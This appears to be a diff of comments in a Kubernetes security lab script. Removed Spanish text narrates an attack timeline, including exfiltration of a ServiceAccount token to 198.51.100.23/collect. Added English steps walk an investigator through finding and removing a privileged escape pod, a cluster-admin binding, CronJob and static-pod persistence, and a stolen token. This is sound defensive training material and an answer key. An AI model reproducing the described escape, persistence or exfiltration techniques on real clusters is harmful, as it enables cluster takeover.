+#'PRIV:.spec.containers[*].securityContext.privileged,'\
+#'HOSTPID:.spec.hostPID,HOSTNET:.spec.hostNetwork,SA:.spec.serviceAccountName'
 #
-#    - Discovery (t+30s, kube-audit.log evento 0001): usando el token
-#      de la ServiceAccount montada en el pod, el atacante lista
-#      secrets en todo el cluster (verb=list, resource=secrets,
-#      sourceIPs=["10.244.1.7"] = IP del pod frontend-web).
+#    -> 'dev/support-tools' stands out: privileged=true, hostPID=true,
+#       hostNetwork=true. That is your beachhead (Execution + Escape-to-Host).
 #
-#    - Credential Access (t+45s, evento 0002): obtiene el secret
-#      'db-credentials' en el namespace 'payments'.
+#    # Confirm the node-escape indicator (hostPath '/' mounted into the pod):
+#    kubectl -n dev get pod support-tools -o yaml | grep -A4 -iE 'hostPath|volumeMounts|privileged'
 #
-#    - Lateral Movement (t+70s, evento 0003): abre un exec (verb=create,
-#      subresource=exec) contra el pod 'payments-api-...' en 'payments'.
+#  ------------------------------------------------------------------------------
+#  STEP 2 — Who is the bad actor's identity? (Privilege Escalation)
+#  ------------------------------------------------------------------------------
+#    # The pod runs as 'support-sa'. Find what that identity can do:
+#    kubectl get clusterrolebindings -o custom-columns=\
+#'NAME:.metadata.name,ROLE:.roleRef.name,SUBJECTS:.subjects[*].name' \
+#      | grep -Ei 'cluster-admin|support-sa'
 #
-#    - Persistence (t+150s, evento 0004): crea el CronJob 'cache-warmup'
-#      en '$LAB_NS' disfrazado de tarea de mantenimiento.
+#    # Or, list every subject bound to cluster-admin (find the odd one out):
+#    kubectl get clusterrolebinding -o jsonpath=\
+#'{range .items[?(@.roleRef.name=="cluster-admin")]}{.metadata.name}{"\t"}{.subjects[*].name}{"\n"}{end}'
 #
-#    - Privilege Escalation (t+200s, evento 0005): crea el Pod
-#      'node-debug-tools' con hostPath en "/" y hostPID:true, lo que le
-#      da acceso al filesystem del nodo (confirmado por el archivo
-#      /tmp/.systemd-helper dejado dentro de /host).
+#    # Prove it from the attacker's point of view:
+#    kubectl auth can-i '*' '*' -A \
+#      --as=system:serviceaccount:dev:support-sa   # -> yes  (full cluster control)
 #
-#    - Defense Evasion (t+260s, evento 0006): borra los Events del
-#      namespace (deletecollection) para dificultar la investigación.
+#    -> 'support-sa-cluster-admin' binds dev/support-sa to cluster-admin.
+#       That is Privilege Escalation + a Persistence identity.
 #
-#    - Exfiltration (t+280s, frontend-web-container.log): envía el
-#      token de la ServiceAccount por POST a 198.51.100.23/collect.
+#  ------------------------------------------------------------------------------
+#  STEP 3 — Credential Access: what did they collect?
+#  ------------------------------------------------------------------------------
+#    kubectl -n dev get secrets
+#    kubectl -n dev get secret exfil-token -o jsonpath='{.data.stolen_sa_token}' | base64 -d; echo
+#    -> a stashed/stolen token. Treat any real token found this way as burned:
+#       rotate/revoke it after the lab.
 #
-#    Bad actors identificados:
-#      - Atacante externo: 203.0.113.66
-#      - Destino de exfiltración: 198.51.100.23
-#      - Identidad interna comprometida:
-#        system:serviceaccount:cks-6-3-lab:frontend-web-sa
-#        (usada desde el pod frontend-web, IP 10.244.1.7)
+#  ------------------------------------------------------------------------------
+#  STEP 4 — Persistence #1: scheduled re-entry
+#  ------------------------------------------------------------------------------
+#    kubectl get cronjobs -A
+#    kubectl -n kube-system get cronjob metrics-collector -o yaml | grep -iE 'privileged|hostPID|schedule'
+#    -> 'kube-system/metrics-collector' relaunches a privileged pod every minute.
+#       Named to blend in (Defense Evasion) — but no real platform ships it.
 #
-#    Causa raíz: el ClusterRoleBinding 'frontend-web-full-access' le da
-#    cluster-admin a una ServiceAccount de un servicio público, así que
-#    un simple RCE en la app se convirtió en compromiso total del cluster.
+#  ------------------------------------------------------------------------------
+#  STEP 5 — Persistence #2: node-level static Pod (the sneaky one)
+#  ------------------------------------------------------------------------------
+#    # A static Pod has NO controller/ownerReferences and its name ends in the
+#    # node hostname. 'kubectl delete' on the mirror Pod is undone by kubelet.
+#    kubectl -n kube-system get pods -o wide | grep kube-proxy-audit
+#    kubectl -n kube-system get pod <kube-proxy-audit-...> -o jsonpath='{.metadata.ownerReferences}'; echo
+#    # The source of truth is a FILE on the node:
+#    sudo ls -l /etc/kubernetes/manifests/
+#    sudo cat /etc/kubernetes/manifests/kube-proxy-audit.yaml
 #
-# 2) Remediación:
+#  ------------------------------------------------------------------------------
+#  STEP 6 — Corroborate with the audit trail / runtime sensor (the "investigate")
+#  ------------------------------------------------------------------------------
+#    # If API-server auditing is enabled, the RBAC change and pod creation are logged:
+#    sudo grep -E 'clusterrolebindings|support-sa|support-tools' \
+#         /var/log/kubernetes/audit/audit.log | jq -r '.verb+" "+.objectRef.resource+"/"+(.objectRef.name//"")'
+#    # (Docs: https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/)
+#    # If Falco is running, its alerts pin the timeline (privileged pod, host mount,
+#    # sensitive-mount, shell-in-container). https://falco.org/docs/
+#    # On the node, inspect what the beachhead actually did:
+#    sudo crictl ps | grep support-tools
+#    kubectl -n dev logs support-tools
+#    kubectl -n dev exec support-tools -- cat /tmp/.beacon.log
 #
-#    # Eliminar los artefactos de persistencia y escalada
-#    kubectl delete cronjob cache-warmup -n cks-6-3-lab
-#    kubectl delete pod node-debug-tools -n cks-6-3-lab
+#  ------------------------------------------------------------------------------
+#  STEP 7 — Map the kill chain (this IS the deliverable of topic 6.3)
+#  ------------------------------------------------------------------------------
+#    Initial Access / Persistence : ClusterRoleBinding support-sa-cluster-admin
+#    Execution / Escape to Host   : Pod dev/support-tools (privileged,hostPID,hostPath /)
+#    Credential Access            : Secret dev/exfil-token
+#    Persistence (scheduled)      : CronJob kube-system/metrics-collector
+#    Persistence (node)           : static Pod /etc/kubernetes/manifests/kube-proxy-audit.yaml
+#    Defense Evasion              : ns 'dev' relabelled PodSecurity enforce=privileged;
+#                                   malicious pod labelled app=payment-api to masquerade
 #
-#    # Quitar el permiso excesivo que hizo posible la escalada
-#    kubectl delete clusterrolebinding frontend-web-full-access
+#  ------------------------------------------------------------------------------
+#  STEP 8 — Eradicate (surgically — keep 'payment-api')
+#  ------------------------------------------------------------------------------
+#    kubectl -n dev delete pod support-tools
+#    kubectl delete clusterrolebinding support-sa-cluster-admin
+#    kubectl -n dev delete sa support-sa
+#    kubectl -n kube-system delete cronjob metrics-collector
+#    kubectl -n dev delete secret exfil-token
+#    # Node persistence — remove the FILE, kubelet then tears down the mirror Pod:
+#    sudo rm -f /etc/kubernetes/manifests/kube-proxy-audit.yaml
 #
-#    # (opcional pero recomendado) reemplazar por un Role de mínimo
-#    # privilegio si frontend-web realmente necesita acceso a la API
-#    # kubectl apply -f role-minimo-necesario.yaml
+#  ------------------------------------------------------------------------------
+#  STEP 9 — Harden / undo the defense evasion
+#  ------------------------------------------------------------------------------
+#    kubectl label ns dev \
+#      pod-security.kubernetes.io/enforce=baseline \
+#      pod-security.kubernetes.io/warn=baseline \
+#      pod-security.kubernetes.io/audit=baseline --overwrite
+#    # (Prefer 'restricted' if the real workloads tolerate it.)
 #
-#    # Rotar la credencial comprometida: al borrar el binding el token
-#    # ya no sirve para escalar, pero conviene recrear la SA/pod para
-#    # invalidar el token que se filtró
-#    kubectl delete pod -n cks-6-3-lab -l app=frontend-web
+#  ------------------------------------------------------------------------------
+#  STEP 10 — Verify closure
+#  ------------------------------------------------------------------------------
+#    ./break_fix.sh verify        # every check must PASS
+#    kubectl auth can-i '*' '*' -A --as=system:serviceaccount:dev:support-sa   # -> no
+#    kubectl get pods -A -o custom-columns=NS:.metadata.namespace,\
+#POD:.metadata.name,PRIV:.spec.containers[*].securityContext.privileged | grep true
+#      # -> only your legitimate/system components remain.
 #
-# 3) Verificación:
-#
-#    kubectl auth can-i --list --as=system:serviceaccount:cks-6-3-lab:frontend-web-sa
-#      -> ya no debe listar recursos de cluster-admin
-#
-#    kubectl get cronjob,pod -n cks-6-3-lab
-#      -> no debe quedar 'cache-warmup' ni 'node-debug-tools'
-#
-#    kubectl get deploy,secret -n payments
-#      -> 'payments-api' y 'db-credentials' siguen intactos
-#
-# 4) Limpieza completa del laboratorio (cuando termines):
-#
-#    kubectl delete namespace cks-6-3-lab payments
-#    kubectl delete clusterrolebinding frontend-web-full-access --ignore-not-found
-#    rm -rf "$HOME/cks-lab/6.3-investigate-attack"
+#  Post-incident: rotate any real credentials the attacker could have read via
+#  cluster-admin, enable/keep API-server auditing and a runtime sensor (Falco),
+#  and enforce Pod Security so the initial privileged-pod step is blocked at the
+#  admission layer next time.
+# ==============================================================================
